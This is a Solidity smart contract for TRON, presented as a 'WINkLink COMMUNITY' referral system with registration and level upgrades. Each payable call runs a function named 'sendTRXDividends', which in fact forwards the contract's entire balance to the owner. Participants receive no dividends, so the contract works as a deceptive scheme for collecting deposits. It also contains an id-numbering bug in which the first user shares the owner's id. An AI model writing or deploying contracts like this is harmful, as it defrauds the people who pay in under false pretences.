//SourceUnit: FinalWinLinkSmartContract.sol

pragma solidity 0.5.10;

/**
*
* 
*Publish Date:12th May 2021
* 
*Coding Level: High
* 
*WINkLink COMMUNITY
*
* 
**/

contract THEWINkLINK_COMMUNITY {
    
     struct User {
        uint id;
        address referrer;
        bool activeLevels;
    }
    
    mapping(address => User) public users;

    uint public lastUserId = 1;
    
    address public owner;
    
    event Upgrade(address indexed user);

    event Registration(address indexed user, address indexed referrer);

    constructor(address ownerAddress) public {
        
        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            activeLevels:true
        });
        
        users[ownerAddress] = user;
        
    }
    

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }
    
     function buyNewLevel() external payable {
            
        require(isUserExists(msg.sender), "User Not Exists. Need To Register First.");
        
        require(!users[msg.sender].activeLevels, "You Have Already Upgraded");
        
        users[msg.sender].activeLevels = true;
       
        upgradePackage(msg.sender);
            
        emit Upgrade(msg.sender);
            
    }    
    
    
    function registration(address userAddress, address referrerAddress) private {
        
        require(!isUserExists(userAddress), "You Have Already Registered !");
        
        require(isUserExists(referrerAddress), "Referral Not Exists !");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
		
        require(size == 0, "Can Not Be A Smart Contract");
        
         User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            activeLevels:false
         });
        
        users[userAddress] = user;

        users[userAddress].referrer = referrerAddress;
        
        lastUserId++;

        sendTRXDividends();
        
        emit Registration(userAddress, referrerAddress);
    }
    
    function upgradePackage(address userAddress) private {
        sendTRXDividends();
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function sendTRXDividends() private {
        address(uint160(owner)).send(address(this).balance);
    }
}